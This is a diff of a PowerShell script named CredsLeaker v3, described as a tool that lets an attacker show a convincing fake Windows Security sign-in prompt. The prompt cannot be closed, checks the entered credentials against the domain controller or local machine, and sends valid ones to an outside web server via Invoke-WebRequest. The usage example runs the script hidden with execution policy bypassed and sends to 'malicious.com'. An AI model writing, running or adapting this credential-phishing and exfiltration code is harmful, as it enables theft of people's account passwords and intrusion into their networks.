@@ -1,12 +1,49 @@
-'''
-Credentials Leaker v3 By Dviros
+<#
+.SYNOPSIS
+    Credentials Leaker v3 By Dviros
+    Author: Dviros
+    Required Dependencies: None
+    Optional Dependencies: None
+ 
+.DESCRIPTION
+    Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and in turn leak it via an HTTP request.
 
-This script will display a Windows Security Credentials box that will ask the user for his credentials.
+.PARAMETER Caption
+    Message box title.
 
-The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC. If its valid, it will close and leak it to a web server outside.
+.PARAMETER Message
+	Message box message.
 
-'''
-###########################################################################################################
+.PARAMETER Server
+	External web server IP or FQDN.
+
+.PARAMETER Port
+	Web server's IP.
+
+.EXAMPLE
+    Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080"
+
+.LINK
+    
+	https://github.com/Dviros/CredsLeaker
+	https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
+	https://www.bleepingcomputer.com/news/security/psa-beware-of-windows-powershell-credential-request-prompts/
+#>
+
+ 
+param (
+	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 0)]
+	[string]$Caption = 'Sign in',
+    
+	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 1)]
+    [string]$Message = 'Enter your credentials',
+
+    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 2)]
+    [string]$Server = '$( Read-Host "Input Server Address (FQDN\IP): " )',
+
+    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 3)]
+    [string]$Port = $( Read-Host "Input Server Port: " )
+)
 
 # Prerequisites
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
@@ -25,11 +62,11 @@ $ComputerName = $env:COMPUTERNAME
 $status = $true
 
 
-# There are 6 different authentication protocols supported. Can be seen here: https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
+# There are 6 different authentication protocols supported.
 $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
 $options.AuthenticationProtocol = 0
-$options.Caption = "Sign in"
-$options.Message = "Enter your credentials"
+$options.Caption = $Caption
+$options.Message = $Message
 $options.TargetName = "1"
 
 
@@ -43,7 +80,7 @@ function Await($WinRtTask, $ResultType) {
 
 function Leaker($domain,$username,$password){
     try{
-        Invoke-WebRequest http://Server_IP:PORT/$domain";"$username";"$password -Method GET -ErrorAction Ignore
+        Invoke-WebRequest http://$Server":"$Port/$domain";"$username";"$password -Method GET -ErrorAction Ignore
         }
     catch{}
     }
@@ -66,7 +103,7 @@ function Credentials(){
                 $domain = "WORKGROUP"
                 $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                 if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
-                    Leaker($domain,$Username,$Password)
+                    Leaker $domain $Username $Password
                     $status = $false
                     exit
                     }
@@ -81,7 +118,7 @@ function Credentials(){
                 Credentials
             }
             else {
-                leaker($CurrentDomain_Name,$username,$password)
+                leaker $CurrentDomain_Name $username $password
                 $status = $false
                 exit
             }
